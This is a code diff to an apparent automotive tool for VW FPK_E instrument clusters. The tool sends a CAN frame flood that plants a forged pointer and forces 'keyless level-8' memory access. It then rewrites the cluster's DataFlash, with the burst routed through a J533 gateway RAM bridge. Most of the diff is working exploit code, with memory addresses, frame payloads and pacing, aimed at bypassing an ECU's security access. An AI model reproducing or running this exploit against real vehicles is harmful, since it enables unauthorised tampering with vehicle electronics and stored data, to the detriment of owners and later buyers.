@@ -90,6 +90,9 @@ FPKE_FORGED_PTR = FPKE_LEVEL_ADDRESS - 6  # 0xFEDF310D
 FPKE_POINTER_FRAME = (FPKE_CANTP_CH9_PTR - FPKE_BLOCK_BUFFER) // 8  # 1019
 FPKE_REQUIRED_LEVEL = 8
 FPKE_DEFAULT_FRAME_DELAY = 0.00035  # 0.35 ms per frame (1022 frames in ~0.358 s)
+# ponytail: ~93 host frames per 64-B block + ~2700 fixed => 128 blocks ~ 15k frames (~1.5 min) at VAS 6154 pace, well
+# under the ~41k frames after which VCIs died mid-transfer. Raise once long VCI writes are proven on the bench.
+FPKE_SLOW_ADAPTER_MAX_BLOCKS = 128
 
 # SW 83A MPU SX RAM applet & RH850 peripheral addresses
 FPKE_APPLET_ENTRY = 0xFEDF1800
@@ -627,6 +630,16 @@ def flood_payload(index: int, *, profile: str = "83a") -> bytes:
     return bytes(data)
 
 
+def fpke_level8_frames(profile: str = "83a") -> list[tuple[int, bytes]]:
+    """The level-8 stream in send order: `ED[0..ptr-1]`, CanTp FF, `ED[ptr]` (forged pointer), CanTp CF (`[level] = 8`)."""
+    ptr_frame = int(fpke_get_profile(profile)["pointer_frame"])
+    frames = [(FPKE_BLOCK_ID, flood_payload(index, profile=profile)) for index in range(ptr_frame)]
+    frames.append((FPKE_CF_CH9_ID, bytes.fromhex("1022800300000000")))
+    frames.append((FPKE_BLOCK_ID, flood_payload(ptr_frame, profile=profile)))
+    frames.append((FPKE_CF_CH9_ID, bytes([0x21, FPKE_REQUIRED_LEVEL, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA])))
+    return frames
+
+
 def partition_chunks(size: int, chunk: int) -> list[int]:
     """Split `size` into `chunk`-sized pieces (plus any remainder)."""
     if size <= 0 or chunk <= 0:
@@ -780,6 +793,10 @@ class FpkeCanLink:
         self.sim_temp_c: float = 90.0
         self.sim_auto_sweep: bool = True
         self._saved_coil_key_flags: tuple[int | None, int] | None = None
+        # Set behind a J533 bridge driven by a slow adapter: sends the level-8 stream from the gateway itself, which
+        # holds the stream built for `gateway_burst_profile`
+        self.gateway_burst: Any = None
+        self.gateway_burst_profile: str | None = None
 
         self.attach_log(log_path)
 
@@ -1478,16 +1495,34 @@ def _managed_fpke_session(
             probe.close()
         return
 
+    # A VAS 6154 sends one frame per 3-7 ms, too slow for the level-8 stream: the gateway sends it instead, so the
+    # table (which depends on the firmware profile) goes into its RAM with the bridge applet. It is built only for
+    # the profile the cluster reports itself: a guessed one forges the wrong pointer into its RAM.
+    gateway_sends_stream = gateway_bridge and bus is None and interface not in FPKE_NATIVE_INTERFACES
+    burst_profile = _read_sw_profile(probe) if gateway_sends_stream else None
     probe.close()
+    if gateway_sends_stream and burst_profile is None:
+        raise RuntimeError(
+            tr(
+                "Панель приборов не сообщила версию ПО (нет ответа на UDS 22 F189 / F187), а без неё шлюзу J533 "
+                "нельзя загрузить поток уровня 8. Включите зажигание (KL15), дождитесь, пока панель проснётся, "
+                "и повторите.",
+                "The instrument cluster did not report its software version (no answer to UDS 22 F189 / F187), "
+                "and the J533 gateway cannot be given the level-8 stream without it. Switch the ignition (KL15) "
+                "on, wait for the cluster to wake up, and retry.",
+            )
+        )
     if not gateway_bridge:
         raise RuntimeError(
             tr(
                 "Для доступа уровня 8 к памяти панели приборов FPK_E через шлюз требуется шлюз "
-                "Continental 3Q0 907 530 и нативный CAN-адаптер (CANable / SLCAN / candleLight) для запуска "
-                "прозрачного RAM-моста — либо прямое подключение к CAN панели приборов (T18).",
+                "Continental 3Q0 907 530 и адаптер с произвольным raw CAN (CANable / SLCAN / candleLight или "
+                "VNCI, принимающий в RawMode все идентификаторы) для запуска прозрачного RAM-моста — либо прямое "
+                "подключение к CAN панели приборов (T18).",
                 "Keyless level-8 access to an FPK_E instrument cluster through a gateway requires a Continental "
-                "3Q0 907 530 gateway and a native CAN adapter (CANable / SLCAN / candleLight) for the transparent "
-                "RAM bridge — or a direct connection to the cluster CAN bus (T18).",
+                "3Q0 907 530 gateway and an adapter with arbitrary raw CAN (CANable / SLCAN / candleLight, or a "
+                "VNCI whose RawMode receives every identifier) for the transparent RAM bridge — or a direct "
+                "connection to the cluster CAN bus (T18).",
             )
         )
 
@@ -1499,6 +1534,7 @@ def _managed_fpke_session(
         target_channel=gateway_channel,
         log_path=log_path,
         bus=bus,
+        burst_frames=fpke_level8_frames(burst_profile) if burst_profile else None,
         reporter=reporter,
     ) as bridge:
         with FpkeCanLink(
@@ -1507,7 +1543,11 @@ def _managed_fpke_session(
             log_path=log_path,
             bus=bridge.bus,
             via_gateway=False,
+            sw_profile=burst_profile,
         ) as br_link:
+            if burst_profile:
+                br_link.gateway_burst = bridge.fire_burst
+                br_link.gateway_burst_profile = burst_profile
             yield br_link, True
 
 
@@ -1595,6 +1635,20 @@ def _probe_link_sw_profile(link: FpkeCanLink, *, force: bool = False) -> str:
     cur = getattr(link, "sw_profile", None)
     if not force and cur in FPKE_PROFILES:
         return str(cur)
+    detected = _read_sw_profile(link)
+    if detected:
+        if detected != cur:
+            link._stack_profile_verified = False
+        link.sw_profile = detected
+        return detected
+    if cur in FPKE_PROFILES:
+        return str(cur)
+    link.sw_profile = "83a"
+    return "83a"
+
+
+def _read_sw_profile(link: FpkeCanLink) -> str | None:
+    """The profile the cluster reports itself in UDS `22 F189` / `22 F187`, or None when it answers neither."""
     f189_str = ""
     f187_str = ""
     with contextlib.suppress(Exception):
@@ -1604,15 +1658,8 @@ def _probe_link_sw_profile(link: FpkeCanLink, *, force: bool = False) -> str:
         r87 = link.request_uds(b"\x22\xf1\x87", 0x62, timeout=0.8)
         f187_str = r87[3:].decode("latin1", errors="ignore").strip("\x00 ")
     if f189_str or f187_str:
-        detected = fpke_detect_sw_profile(f189=f189_str, f187=f187_str)
-        if detected != cur:
-            link._stack_profile_verified = False
-        link.sw_profile = detected
-        return detected
-    if cur in FPKE_PROFILES:
-        return str(cur)
-    link.sw_profile = "83a"
-    return "83a"
+        return fpke_detect_sw_profile(f189=f189_str, f187=f187_str)
+    return None
 
 
 def _refine_link_profile_from_stack(link: FpkeCanLink, *, force: bool = False) -> dict[str, Any]:
@@ -1757,7 +1804,22 @@ def fpke_establish_level8(
     reporter.can_log(tr("UDS 10 03 + SecurityAccess 27 03/04 (+0xB80B) + DID 0514 arming", "UDS 10 03 + SecurityAccess 27 03/04 (+0xB80B) + DID 0514 arming"))
     link.request_uds(b"\x10\x03", 0x50, timeout=2.0)
     link._stack_profile_verified = False
-    if getattr(link, "_explicit_sw_profile", None) is None:
+    if link.gateway_burst is not None:
+        # The gateway holds the stream for one profile: the cluster answering now must report that same one
+        want = str(link.gateway_burst_profile).upper()
+        live = _read_sw_profile(link)
+        if live != link.gateway_burst_profile:
+            raise RuntimeError(
+                tr(
+                    f"Поток уровня 8 не отправлен: шлюз J533 загружен потоком для ПО панели {want}, а панель "
+                    f"сейчас отвечает на UDS 22 F189 / F187: {live.upper() if live else 'нет ответа'}. "
+                    "Повторите операцию.",
+                    f"The level-8 stream was not sent: the J533 gateway holds the stream for cluster software "
+                    f"{want}, but the cluster now answers UDS 22 F189 / F187 with: "
+                    f"{live.upper() if live else 'no answer'}. Retry the operation.",
+                )
+            )
+    elif getattr(link, "_explicit_sw_profile", None) is None:
         _probe_link_sw_profile(link, force=True)
     prof = _resolve_link_profile(link)
     prof_name = str(prof["name"])
@@ -1813,24 +1875,20 @@ def fpke_establish_level8(
         )
     )
 
+    frames = fpke_level8_frames(prof_name)
     link.stop_keepalive()
     t_start = time.monotonic()
-    next_frame = time.perf_counter()
-
-    def _paced_send(arb_id: int, frame_bytes: bytes) -> None:
-        nonlocal next_frame
-        link.send_frame(arb_id, frame_bytes, extended=True)
-        if frame_delay > 0:
-            next_frame += frame_delay
-            delay = next_frame - time.perf_counter()
-            if delay > 0:
-                time.sleep(delay)
-
-    for index in range(ptr_frame):
-        _paced_send(FPKE_BLOCK_ID, flood_payload(index, profile=prof_name))
-    _paced_send(FPKE_CF_CH9_ID, bytes.fromhex("1022800300000000"))
-    _paced_send(FPKE_BLOCK_ID, flood_payload(ptr_frame, profile=prof_name))
-    _paced_send(FPKE_CF_CH9_ID, bytes([0x21, FPKE_REQUIRED_LEVEL, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA]))
+    if link.gateway_burst is not None:
+        link.gateway_burst(frames)  # the J533 bridge sends them itself: a VAS 6154 cannot keep this pace
+    else:
+        next_frame = time.perf_counter()
+        for arb_id, frame_bytes in frames:
+            link.send_frame(arb_id, frame_bytes, extended=True)
+            if frame_delay > 0:
+                next_frame += frame_delay
+                delay = next_frame - time.perf_counter()
+                if delay > 0:
+                    time.sleep(delay)
     stream_elapsed = round(time.monotonic() - t_start, 3)
 
     if post_exploit_sleep > 0:
@@ -3721,6 +3779,25 @@ def _build_faci_block_jobs(
     return raw_jobs
 
 
+def _refuse_slow_adapter_write(interface: str, blocks: int) -> None:
+    """Refuse a DataFlash write of more than `FPKE_SLOW_ADAPTER_MAX_BLOCKS` blocks over a non-native adapter.
+
+    Called before anything is written. A VAS 6154 sends one frame per 3-7 ms: a rewrite this large runs for minutes,
+    and a VCI that drops mid-list leaves the cluster with part of the diff."""
+    if interface in FPKE_NATIVE_INTERFACES or blocks <= FPKE_SLOW_ADAPTER_MAX_BLOCKS:
+        return
+    name_ru = "VAS 6154 / VNCI" if interface == "dpdu" else f"адаптер «{interface}»"
+    name_en = "a VAS 6154 / VNCI" if interface == "dpdu" else f"adapter “{interface}”"
+    raise RuntimeError(tr(
+        f"Запись {blocks} блоков DataFlash через {name_ru} не начата: через этот адаптер разрешено не больше "
+        f"{FPKE_SLOW_ADAPTER_MAX_BLOCKS} блоков за раз. Для большой перезаписи подключите CANable / candleLight "
+        f"(через шлюз или напрямую к T18).",
+        f"Writing {blocks} DataFlash blocks through {name_en} was not started: this adapter is limited to "
+        f"{FPKE_SLOW_ADAPTER_MAX_BLOCKS} blocks per write. For a large rewrite connect a CANable / candleLight "
+        f"(through the gateway or directly to T18).",
+    ))
+
+
 def fpke_write_dflash_blocks_in_session(
     link: FpkeCanLink,
     block_jobs: list[dict[str, Any]],
@@ -4090,6 +4167,12 @@ def can_fpke_write_dflash(
                 )
             else:
                 write_mode = "full_blank_checked_diff"
+                target_clean_df, target_mask = normalize_fpke_dflash_for_faci(cand_bytes, cflash_bytes)
+                # The CPU-read backup already tells how many blocks change: refuse before the 64 KB blank-check
+                est_clean_df, est_mask = normalize_fpke_dflash_for_faci(dflash_before, cflash_bytes)
+                _refuse_slow_adapter_write(link.interface, len(_build_faci_block_jobs(
+                    est_clean_df, est_mask, target_clean_df, target_mask, vb_size=vb_sz, pool_end=pool_end
+                )))
                 live_clean_df, live_mask = fpke_read_dflash_blank_checked(
                     link,
                     offset=0,
@@ -4097,7 +4180,6 @@ def can_fpke_write_dflash(
                     cpu_dflash=dflash_before,
                     reporter=reporter,
                 )
-                target_clean_df, target_mask = normalize_fpke_dflash_for_faci(cand_bytes, cflash_bytes)
                 block_jobs = _build_faci_block_jobs(
                     live_clean_df,
                     live_mask,
@@ -4106,6 +4188,8 @@ def can_fpke_write_dflash(
                     vb_size=vb_sz,
                     pool_end=pool_end,
                 )
+
+            _refuse_slow_adapter_write(link.interface, len(block_jobs))
 
             # Step 4: Uninterruptible FACI Erase/Program
             reporter.step(
